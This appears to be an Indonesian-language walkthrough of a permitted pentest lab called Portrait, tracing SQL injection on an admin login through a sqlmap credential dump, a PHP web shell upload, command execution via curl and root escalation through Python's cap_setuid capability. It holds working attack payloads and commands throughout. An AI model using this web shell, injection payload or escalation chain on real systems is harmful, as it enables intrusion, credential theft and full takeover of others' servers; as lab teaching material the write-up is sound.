# 02 — Pembahasan Detail Lab Portrait
## SQL Injection → Admin Login → Upload PHP → Python Capability → Root

> Dokumen ini untuk pembelajaran pentest pada **lab yang berizin**.  
> Fokus pembelajaran: bagaimana SQL Injection dapat berkembang menjadi upload shell dan privilege escalation melalui Linux capability.

---

## 1. Gambaran Umum

Lab Portrait mengajarkan serangan aplikasi web yang berlanjut ke privilege escalation lokal:

```text
Login admin rentan SQL Injection
→ credential admin diperoleh
→ login ke aplikasi
→ upload web shell PHP
→ command execution sebagai www-data
→ temukan Python dengan cap_setuid=ep
→ os.setuid(0)
→ root
→ cari flag
```

Celah awal berada pada aplikasi web, sedangkan privilege escalation terjadi karena salah konfigurasi capability pada Python.

---

## 2. Data Lab

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.118` |
| Web | `http://192.168.56.118:8080` |
| Login admin | `/administrator` |
| Fitur upload | `/profile` |
| Lokasi upload | `/uploads` |
| Credential admin | `admin:AdminPortr417126` |
| Web shell | `cakgup.php` |
| User awal | `www-data` |
| Privesc | `/usr/bin/python3.13 cap_setuid=ep` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Konsep yang Dipelajari

### 3.1 SQL Injection

SQL Injection terjadi ketika input user dimasukkan ke query SQL tanpa sanitasi yang benar. Pada login form, payload seperti ini dapat mengubah logika autentikasi:

```text
' OR '1'='1
```

### 3.2 File Upload to RCE

Upload file berbahaya jika:
- aplikasi menerima file PHP;
- file tersimpan di direktori yang bisa diakses web;
- server mengeksekusi file PHP tersebut.

### 3.3 Linux Capability

Linux capability memberi hak khusus ke binary tertentu tanpa full root. Capability berikut sangat berbahaya:

```text
cap_setuid=ep
```

Jika Python memiliki capability ini, script Python dapat memanggil:

```python
os.setuid(0)
```

dan berubah menjadi root.

---

## 4. Fase 1 — Recon

### Tujuan

Menemukan halaman login admin, fitur upload, dan lokasi file upload.

### Command

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"

nmap -Pn -sC -sV -p8080 "$TARGET"
dirsearch -u "$WEB" -e php
```

### Output yang Diharapkan

```text
/administrator
/profile
/uploads
```

### Penjelasan

```text
/administrator → tempat uji login dan SQL Injection
/profile       → tempat upload avatar/file
/uploads       → lokasi file upload dapat dipanggil
```

---

## 5. Fase 2 — Uji SQL Injection

### Tujuan

Membuktikan bahwa login admin rentan SQL Injection dan memperoleh credential.

### Uji Manual

Pada field username atau password, payload umum:

```text
' OR '1'='1
```

### Mengapa Payload Ini Bekerja?

Jika query login kurang aman, query dapat berubah menjadi kondisi yang selalu benar:

```sql
WHERE username = '' OR '1'='1'
```

`'1'='1'` selalu benar.

---

## 6. Fase 3 — Dump Credential dengan SQLMap

### Set Variabel

```bash
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

### Cari Database

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

### Output

```text
current database: 'portrait'
```

### Cari Tabel

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables
```

### Output

```text
users
```

### Dump Tabel Users

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

### Output Lab

```text
Username : admin
Password : AdminPortr417126
```

### Penjelasan

Hafalan SQLMap:

```text
D-T-D
Database → Tables → Dump
```

Kita tidak berhenti pada bypass login, tetapi mengambil credential agar bisa login normal ke aplikasi.

---

## 7. Fase 4 — Login Admin dan Upload Web Shell

### Login

```text
URL      : http://192.168.56.118:8080/administrator
Username : admin
Password : AdminPortr417126
```

Setelah login, buka:

```text
http://192.168.56.118:8080/profile
```

### Buat Web Shell

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

### Penjelasan Kode

```php
system($_GET['cmd']);
```

berarti nilai parameter `cmd` pada URL akan dijalankan sebagai command OS.

Contoh:

```text
/uploads/cakgup.php?cmd=id
```

akan menjalankan `id`.

### Upload

Upload `cakgup.php` melalui fitur avatar/profile.

Jika aplikasi memeriksa MIME type, uji dengan Content-Type seperti:

```text
image/jpeg
```

Tetapi yang paling penting adalah file tetap diproses sebagai PHP setelah upload.

---

## 8. Fase 5 — Validasi RCE

### Command

```bash
SHELL_URL="$WEB/uploads/cakgup.php"

curl -sG \
  --data-urlencode "cmd=id; whoami; hostname" \
  "$SHELL_URL"
```

### Output yang Diharapkan

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

### Penjelasan

Output `uid=33(www-data)` membuktikan:
- file PHP berhasil diakses;
- kode PHP dieksekusi server;
- command OS berjalan sebagai user web server.

Upload saja belum cukup disebut RCE. RCE terbukti setelah `cmd=id` menghasilkan output sistem.

---

## 9. Fase 6 — Enumerasi Capability

### Tujuan

Menemukan binary yang memiliki privilege khusus.

### Command

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null" \
  "$SHELL_URL"
```

### Output Lab

```text
/usr/bin/python3.13 cap_setuid=ep
```

### Penjelasan

`cap_setuid=ep` berarti binary Python dapat melakukan operasi setuid. Dengan command Python, kita dapat mengubah UID proses menjadi 0.

Rumus hafalan:

```text
Python + cap_setuid + os.setuid(0) = root
```

---

## 10. Fase 7 — Root Proof

### Command

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  "$SHELL_URL"
```

### Output yang Diharapkan

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
root
```

### Penjelasan

`whoami` menjadi `root`, dan `uid=0(root)` menunjukkan proses berjalan sebagai root.

---

## 11. Fase 8 — Cari dan Baca Flag

Karena path flag tidak selalu diketahui, cari terlebih dahulu.

### Cari Flag

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"find / -type f -iname \\\"*flag*\\\" 2>/dev/null\")'" \
  "$SHELL_URL"
```

### Output Contoh

```text
/root/flag.txt
```

### Baca Flag

Ganti `/PATH/FLAG` dengan hasil `find`.

```bash
curl -sG \
  --data-urlencode "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"cat /PATH/FLAG\")'" \
  "$SHELL_URL"
```

---

## 12. Troubleshooting Portrait

### Web shell 404

```bash
curl -i "$WEB/uploads/cakgup.php?cmd=id"
```

Cek:
- nama file benar;
- lokasi upload benar;
- aplikasi mengubah nama file atau tidak.

### PHP tidak dieksekusi

Jika file terunduh sebagai gambar atau teks, berarti direktori upload tidak memproses PHP.

### Python path berbeda

```bash
curl -sG \
  --data-urlencode "cmd=getcap -r / 2>/dev/null | grep -i python" \
  "$SHELL_URL"
```

Gunakan path Python yang muncul.

---

## 13. Ringkasan Hafalan Portrait

```text
/administrator
SQLi login
sqlmap D-T-D
admin:AdminPortr417126
/profile upload PHP
/uploads/cakgup.php?cmd=id
www-data
getcap python
cap_setuid=ep
os.setuid(0)
root
find flag
cat flag
```
